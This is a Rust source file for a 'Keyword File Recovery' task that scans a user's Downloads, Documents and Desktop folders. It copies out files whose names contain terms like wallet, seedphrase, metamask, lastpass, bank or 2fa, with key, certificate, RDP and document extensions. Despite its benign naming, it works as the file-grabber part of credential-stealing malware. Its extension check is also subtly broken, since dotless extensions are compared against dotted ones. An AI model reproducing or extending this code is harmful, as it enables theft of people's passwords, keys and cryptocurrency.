use crate::recovery::{
    context::RecoveryContext,
    fs::sanitize_label,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use crate::recovery::settings::RecoveryControl;
use async_trait::async_trait;
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::{fs, task};
use tracing::{debug, warn};
use walkdir::WalkDir;

const ALLOWED_EXTENSIONS: &[&str] = &[
    ".jpg", ".png", ".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".ldb",
    ".log", ".pem", ".ppk", ".key", ".pfx",
];

const KEYWORDS: &[&str] = &[
    "2fa",
    "account",
    "auth",
    "backup",
    "bank",
    "binance",
    "bitcoin",
    "bitwarden",
    "btc",
    "casino",
    "code",
    "coinbase",
    "crypto",
    "dashlane",
    "discord",
    "eth",
    "exodus",
    "facebook",
    "funds",
    "info",
    "keepass",
    "keys",
    "kraken",
    "kucoin",
    "lastpass",
    "ledger",
    "login",
    "mail",
    "memo",
    "metamask",
    "mnemonic",
    "nordpass",
    "note",
    "pass",
    "passphrase",
    "paypal",
    "pgp",
    "private",
    "pw",
    "recovery",
    "remote",
    "roboform",
    "secret",
    "seedphrase",
    "server",
    "skrill",
    "smtp",
    "solana",
    "syncthing",
    "tether",
    "token",
    "trading",
    "trezor",
    "venmo",
    "vault",
    "wallet",
];

const MAX_FILE_SIZE: u64 = 1_000_000;
const MAX_ARTIFACTS: usize = 1024;

pub struct FileRecoveryTask {
    directories: Vec<(String, PathBuf)>,
}

impl FileRecoveryTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        let home = ctx.home_dir.clone();
        let directories = vec![
            ("Downloads".to_string(), home.join("Downloads")),
            ("Documents".to_string(), home.join("Documents")),
            ("Desktop".to_string(), home.join("Desktop")),
        ];
        Self { directories }
    }
}

#[async_trait]
impl RecoveryTask for FileRecoveryTask {
    fn label(&self) -> String {
        "Keyword File Recovery".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let output_root = file_recovery_output_dir(ctx).await?;
        let directories = self.directories.clone();
        
        let control = RecoveryControl::global();
        let mut allowed_extensions: HashSet<String> = ALLOWED_EXTENSIONS
            .iter()
            .map(|ext| ext.to_ascii_lowercase())
            .collect();

        for ext in control.custom_extensions() {
            let normalized = if ext.starts_with('.') {
                ext.to_ascii_lowercase()
            } else {
                format!(".{}", ext.to_ascii_lowercase())
            };
            allowed_extensions.insert(normalized);
        }

        let mut keywords: Vec<String> = KEYWORDS.iter().map(|kw| kw.to_ascii_lowercase()).collect();
        for kw in control.custom_keywords() {
            keywords.push(kw.to_ascii_lowercase());
        }

        let artifacts = task::spawn_blocking(move || {
            let mut collected = Vec::new();

            for (label, root) in directories {
                if !root.exists() {
                    debug!(path=?root, "file recovery root missing");
                    continue;
                }

                for entry in WalkDir::new(&root).follow_links(false) {
                    if collected.len() >= MAX_ARTIFACTS {
                        break;
                    }
                    let entry = match entry {
                        Ok(entry) => entry,
                        Err(err) => {
                            warn!(error=?err, path=?root, "failed to walk directory");
                            continue;
                        }
                    };
                    if !entry.file_type().is_file() {
                        continue;
                    }

                    let path = entry.path();
                    if !matches_extension(path, &allowed_extensions) {
                        continue;
                    }
                    if !matches_keywords(path, &keywords) {
                        continue;
                    }

                    let metadata = match std::fs::metadata(path) {
                        Ok(meta) => meta,
                        Err(err) => {
                            warn!(error=?err, path=?path, "failed to read metadata");
                            continue;
                        }
                    };
                    if metadata.len() > MAX_FILE_SIZE {
                        continue;
                    }

                    let relative = match path.strip_prefix(&root) {
                        Ok(rel) => rel.to_path_buf(),
                        Err(_) => path.to_path_buf(),
                    };

                    let dest = output_root
                        .join(sanitize_label(&label))
                        .join(relative.clone());
                    if let Some(parent) = dest.parent() {
                        if let Err(err) = std::fs::create_dir_all(parent) {
                            warn!(error=?err, path=?parent, "failed to create destination directory");
                            continue;
                        }
                    }

                    if let Err(err) = std::fs::copy(path, &dest) {
                        warn!(error=?err, path=?path, "failed to copy file");
                        continue;
                    }

                    match std::fs::metadata(&dest) {
                        Ok(dest_meta) => collected.push(RecoveryArtifact {
                            label: format!("File Recovery ({label})"),
                            path: dest,
                            size_bytes: dest_meta.len(),
                            modified: dest_meta.modified().ok(),
                        }),
                        Err(err) => {
                            warn!(error=?err, path=?dest, "failed to read destination metadata");
                        }
                    }
                }
            }

            collected
        })
        .await
        .map_err(|err| RecoveryError::Custom(format!("file recovery interrupted: {err}")))?;

        Ok(artifacts)
    }
}

pub fn file_recovery_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(FileRecoveryTask::new(ctx))
}

async fn file_recovery_output_dir(ctx: &RecoveryContext) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("System")
        .join("File Recovery");
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

fn matches_extension(path: &Path, allowed: &HashSet<String>) -> bool {
    path.extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| allowed.contains(&ext.to_ascii_lowercase()))
        .unwrap_or(false)
}

fn matches_keywords(path: &Path, keywords: &[String]) -> bool {
    let candidate = match path.file_name().and_then(|name| name.to_str()) {
        Some(name) => name.to_ascii_lowercase(),
        None => return false,
    };

    keywords.iter().any(|keyword| candidate.contains(keyword))
}